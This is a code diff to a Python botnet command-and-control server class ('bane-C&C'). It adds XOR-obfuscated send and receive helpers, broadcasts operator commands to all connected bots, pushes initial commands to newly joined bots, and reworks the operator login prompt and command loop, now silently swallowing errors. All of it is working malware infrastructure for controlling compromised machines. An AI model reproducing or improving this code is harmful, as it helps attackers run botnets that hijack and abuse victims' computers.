@@ -11,9 +11,34 @@ class Botnet_C_C_Server:
     password_prompt="\r\npassword: "
     user_prompt="{}@bane-C&C:$"
 
+    @staticmethod
+    def send_data(data,sock,xor_key=None,read_output=True):
+        data='{}'.format(data)
+        if xor_key not in [None,''] and data.strip()!='':
+            data= XOR.encrypt(data,xor_key)
+        sock.send(data.encode())
+        if read_output==True:
+            return Botnet_C_C_Server.read_data(sock,xor_key=xor_key)
+
+    @staticmethod
+    def read_data(sock,xor_key=None):
+        data=''
+        while True:
+            try:
+                d=sock.recv(1024).decode()
+                if xor_key not in [None,''] and d.strip()!='':
+                    d= XOR.encrypt(d,xor_key)
+                if d.strip()=='':
+                    break
+                data+=d
+                if '\n' in data:
+                    break
+            except Exception as ex:
+                break
+        return data.strip()
 
     def process_cmd(self,cmd,user_socket,user):
-        self.send_command(cmd,user_socket,user)
+        self.send_command(cmd,user_socket,user,)
 
     def ping(self):
         while True:
@@ -35,11 +60,9 @@ class Botnet_C_C_Server:
             if self.sending==False:
                 break
         self.sending=True
-        if self.bots_encryption_key not in [None,''] and command!='':
-            command=XOR.encrypt(command,self.bots_encryption_key)
         for client_socket in self.bots_list:
             try:
-                client_socket.send("{}".format(command).encode())
+                Botnet_C_C_Server.send_data(command,client_socket,xor_key=self.bots_encryption_key)
             except Exception as ex:
                 #print(ex)#raise Exception(ex)
                 try:
@@ -51,17 +74,12 @@ class Botnet_C_C_Server:
             self.bots_list.remove(x)
         self.sending=False
         if is_ping==False:
-            user_socket.send('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip().encode())
+            Botnet_C_C_Server.send_data('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip(),user_socket,xor_key=self.users_encryption_key)
 
     def handle_bot(self,client_socket):
         try:
-            for x in self.initial_commands_list:
-                command=x
-                client_socket.send("{}".format(command).encode())
-                while True:
-                    data = client_socket.recv(self.socket_buffer_size)
-                    if not data:
-                        break
+            for command in self.initial_commands_list:
+                Botnet_C_C_Server.send_data(command,client_socket,xor_key=self.bots_encryption_key,read_output=False)
         except Exception as exx:
             pass#raise Exception(exx)
 
@@ -69,35 +87,21 @@ class Botnet_C_C_Server:
     def handle_user(self,client_socket):
         try:
             banner=Botnet_C_C_Server.banner+Botnet_C_C_Server.username_prompt
-            client_socket.send(banner.encode())
-            user=''
-            while True:
-                user+=client_socket.recv(self.socket_buffer_size).decode()
-                if '\n' in user:
-                    user=user.strip()
-                    break
-            client_socket.send(Botnet_C_C_Server.password_prompt.encode())
-            pwd=''
-            while True:
-                pwd+=client_socket.recv(self.socket_buffer_size).decode()
-                if '\n' in pwd:
-                    pwd=pwd.strip()
-                    break
+            user=Botnet_C_C_Server.send_data(banner,client_socket,xor_key=self.users_encryption_key)
+            pwd=Botnet_C_C_Server.send_data(Botnet_C_C_Server.password_prompt,client_socket,xor_key=self.users_encryption_key)
             if self.login(username=user,password=pwd)==True:
-                client_socket.send('\r\n\r\nTotal Bots: {}\r\n\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).encode())
+                snd='\r\n\r\nTotal Bots: {}\r\n\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip())
+                if self.users_encryption_key not in ['',None]:
+                    snd=XOR.encrypt(snd,self.users_encryption_key)
+                client_socket.send(snd.encode())
                 while True:
-                    data=''
-                    while True:
-                        data+=client_socket.recv(self.socket_buffer_size).decode()
-                        if '\n' in data:
-                            data=data.strip()
-                            break
+                    data=Botnet_C_C_Server.read_data(client_socket,xor_key=self.users_encryption_key)
                     self.process_cmd(data.strip(),client_socket,user)                       
             else:
                 client_socket.send('login failed'.encode())
                 client_socket.close()
         except Exception as ex:
-            raise(ex)
+            pass
         try:
             client_socket.close()
         except:
